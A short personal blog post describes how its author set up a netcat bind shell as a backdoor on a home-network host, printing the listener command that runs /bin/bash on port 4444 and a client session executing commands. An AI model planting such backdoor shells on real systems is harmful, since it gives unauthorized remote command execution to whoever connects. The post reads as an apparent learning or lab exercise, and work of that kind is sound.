---
title: "Remote bash shell using netcat"
date: 2020-12-15T16:20:51-06:00
toc: false
images:
categories:
  - tech
tags: 
  - security
  - nc
  - remoteshell
---

# Overview

In a recent project, I was asked to compromise and install a backdoor shell by exploiting a flaw in the package management system.  To keep it simple, I chose `nc` (netcat) as the conduit to make the connection and execute `/bin/bash` on the remote host.  


# Details 

On the remote system, I deployed a `nc` listener waiting for a connection on TCP port 4444.  When a connection is made, `nc` executes `/bin/bash`:

```
jemurray@home-server:~$ nc.traditional -lv -s 192.168.86.5 -p 4444 -e /bin/bash
listening on [192.168.86.5] 4444 ...
```

On the remote system, execute the `nc` client to connect to port 4444.  No shell prompt is returned, but any command sent is executed in the `/bin/bash` shell:

```
jemurray@mbp-2019:~ $ nc 192.168.86.5 4444
hostname
home-server
uptime
 16:22:59 up 74 days, 23:08,  9 users,  load average: 1.04, 1.07, 1.02
```


In the next few months I will produce a full write up, stay tuned.